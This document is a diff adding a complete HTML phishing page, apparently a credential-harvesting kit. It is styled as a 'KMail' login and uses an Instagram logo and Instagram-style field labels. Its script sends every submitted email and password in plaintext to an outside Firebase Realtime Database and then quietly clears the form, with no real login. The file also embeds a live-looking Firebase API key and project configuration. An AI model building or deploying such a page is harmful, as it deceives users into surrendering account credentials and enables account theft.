@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KMail Login</title>
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .login-box {
+            width: 100%;
+            max-width: 350px;
+            padding: 40px;
+            margin: 0 auto;
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+        }
+        .login-box img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+        .login-box form {
+            display: flex;
+            flex-direction: column;
+        }
+        .login-box input {
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+        }
+        .login-box button {
+            padding: 10px;
+            background: #3897f0;
+            border: none;
+            border-radius: 3px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .login-box a {
+            color: #00376b;
+            font-size: 14px;
+            text-decoration: none;
+        }
+    </style>
+    <!-- Include Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png" alt="KMail logo"> <!-- Change this URL to your logo image -->
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div>
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+    <script>
+        // Your web app's Firebase configuration
+        var firebaseConfig = {
+           apiKey: "AIzaSyBBf9zQn7mLcvg_Z9-ZxaUvBBKsLpersI4",
+    authDomain: "poketacks-3da45.firebaseapp.com",
+    databaseURL: "https://poketacks-3da45-default-rtdb.firebaseio.com",
+    projectId: "poketacks-3da45",
+    storageBucket: "poketacks-3da45.appspot.com",
+    messagingSenderId: "802470541089",
+    appId: "1:802470541089:web:02b8c3ba0cd9f5c7b13060",
+    measurementId: "G-KM910YBPL9"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        
+        // Reference to the Firebase Realtime Database
+        var database = firebase.database();
+
+        // Form submission handler
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Send email and password to Firebase Realtime Database
+            database.ref('users').push({
+                email: email,
+                password: password
+            }).then(function() {
+             //   alert('Login information submitted!');
+                // Optionally, redirect to another page or reset the form
+                document.getElementById('loginForm').reset();
+            }).catch(function(error) {
+                console.error('Error writing to database: ', error);
+            });
+        });
+    </script>
+</body>
+</html>
